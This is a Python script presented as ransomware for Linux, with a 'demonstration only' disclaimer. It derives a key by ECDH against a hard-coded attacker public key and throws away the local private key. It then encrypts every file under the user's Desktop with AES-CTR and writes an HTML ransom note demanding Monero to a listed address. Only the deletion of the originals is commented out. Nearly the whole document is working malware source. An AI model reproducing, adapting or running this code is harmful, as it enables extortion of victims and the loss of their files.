# Ransomware for Linux, written in Python.
# Note: This program is for demonstration purposes only. I take no responsibility for anything.
import cryptography
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization
backend = default_backend();

import hashlib
import os

evil_public_key = serialization.load_pem_public_key("-----BEGIN PUBLIC KEY-----\nMFYwEAYHKoZIzj0CAQYFK4EEAAoDQgAEWMYwt6gFZmlGORi+yydidFoezTyRJwIL\ne9c6kFhvHXEjM61WRHpm34I8nKffqP9dFCfGXwUwDvfKGv+jpOL+Ow==\n-----END PUBLIC KEY-----\n", backend=backend); # Public key of the attacker
evil_address = "435PVHhaBWwAEGDdk8aEL9RwNDEhoGZYBMuTLHWKvT74K8DRzxMXjVA3bHg8gnQpKDTqxjwxuh85tMKwLserDG3nMmGHdh4"; # Address of the attacker

private_key = ec.generate_private_key(ec.SECP256K1(), backend) # Create a private key to create shared key
shared_key = private_key.exchange(ec.ECDH(), evil_public_key)
public_key = private_key.public_key() # Forget the private key
del private_key

# Find all the things (in the home directory)
matches = []
for root, dirnames, filenames in os.walk(os.environ['HOME']+'/Desktop'):
	for filename in filenames:
		if filename[-5:] != ".lcry" and filename[-15:] != "linuxdecrypt.py":
			matches.append(os.path.join(root, filename));

# Encrypt all the found things
sha_iterations = 0;
for match in matches:
	try:
		with open(match, 'r') as matchFile, open(match+'.lcry', 'w') as encFile:
			# Generate metadata and write
			sha_iterations += 1;
			shared_key = hashlib.sha256(shared_key).digest();
			salt = os.urandom(16);
			iv = os.urandom(16);
			file_key = hashlib.sha256(shared_key+salt).digest();
			with open(match+'.lcryme', 'w') as metaFile:
				metaFile.write(str(sha_iterations) + ' ' + iv.encode('hex') + ' ' + salt.encode('hex'));
			# Encrypt
			encryptor = Cipher(algorithms.AES(file_key), modes.CTR(iv), backend=backend).encryptor();
			block = "A";
			while block != "":
				block = matchFile.read(4096);
				encFile.write(encryptor.update(block));
			encFile.write(encryptor.finalize());
	#	os.unlink(match); # I'm keeping this commented out for safety :)
	except Exception:
		pass;

# Ransom note
public_bytes = public_key.public_bytes(encoding=serialization.Encoding.DER, format=serialization.PublicFormat.SubjectPublicKeyInfo).encode('hex');
with open(os.environ['HOME'] + '/ENCRYPTED.html', 'w') as ransomFile:
	ransomFile.write('<html><body>Your files have been encrypted with AES-256!<br/>Send 1 XMR to ' + evil_address +
			 'to recover your files!<br/>Your unique public key is:<br/><pre>' + public_bytes + '</pre></body></html>');

# Create verification file
with open(os.environ['HOME'] + '/testfile.lcrypt', 'w') as testFile:
	testFile.write(str(sha_iterations) + ' ' + hashlib.sha256(shared_key).hexdigest()) # 1 less than total sha iterations